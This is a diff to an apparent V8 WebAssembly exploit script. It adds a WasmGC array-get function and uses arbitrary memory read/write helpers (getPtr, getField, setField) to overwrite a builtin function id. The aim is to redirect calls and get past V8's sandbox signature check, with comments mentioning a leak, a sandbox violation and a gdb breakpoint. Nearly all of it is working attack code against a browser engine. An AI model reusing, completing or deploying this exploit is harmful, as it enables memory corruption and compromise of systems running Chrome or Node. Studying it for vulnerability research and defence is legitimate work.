@@ -50,6 +50,16 @@ let $f1 = builder.addFunction("func1", $sig_leak)
         kExprI64Const, 0,
     ]);
 
+
+// ==================================================
+let array = builder.addArray(kWasmI32, true);
+let $sig_array = builder.addType( makeSig([wasmRefNullType(array), kWasmI32], [kWasmI32]));
+let $a0 = builder.addFunction(
+  "arrayGet", makeSig([wasmRefNullType(array), kWasmI32], [kWasmI32]))
+.addBody([kExprLocalGet, 0, kExprLocalGet, 1,
+          kGCPrefix, kExprArrayGet, array])
+.exportFunc();
+
 // %DebugPrint($f1);
 
 let $t0 =
@@ -69,6 +79,7 @@ let boom = instance.exports.boom;
 let func0 = instance.exports.func0;
 let table0 = instance.exports.table0;
 let func1 = instance.exports.func1;
+let arrayGet = instance.exports.arrayGet;
 
 // %DebugPrint(instance.exports.func1);
 // %DebugPrint(instance.exports.func0);
@@ -87,18 +98,25 @@ let new_type = (($sig_v_v << kHeapTypeShift) | kRef) << kSmiTagSize;
 
 // setField(t0, kWasmTableObjectTypeOffset, new_type);
 // setting type before setting func0
-let id_builtins_function = Number(getField(getPtr(instance.exports.func1), 0xb+1));
+let changed_func = arrayGet;
+let id_builtins_function = Number(getField(getPtr(changed_func), 0xb+1));
 console.log("0x" + id_builtins_function.toString(16));
-setField((getPtr(instance.exports.func1)), 0xb+1, id_builtins_function - (0x15fc-0x12d4)*0x200);
+
+/*
+b*0x555556ae74d3
+condition 1  (($rcx & 0xFFFFFF) == 0x16690)
+*/
+setField((getPtr(changed_func)), 0xb+1, id_builtins_function - (0x15fc-0x1669)*0x200);
 
 // This should run into a signature check that kills the process.
 // table0.set(0, func1);
-func1();
+// func1();
+changed_func(1, 0x41414141n);
 // call func1 with func0's arguments
 
 
 // If the process was still alive, this would cause the sandbox violation.
-let leak = instance.exports.boom();
+// let leak = instance.exports.boom();
 
-console.log("Leak: 0x" + leak[1].toString(16));
+// console.log("Leak: 0x" + leak[1].toString(16));
 // ====================================================
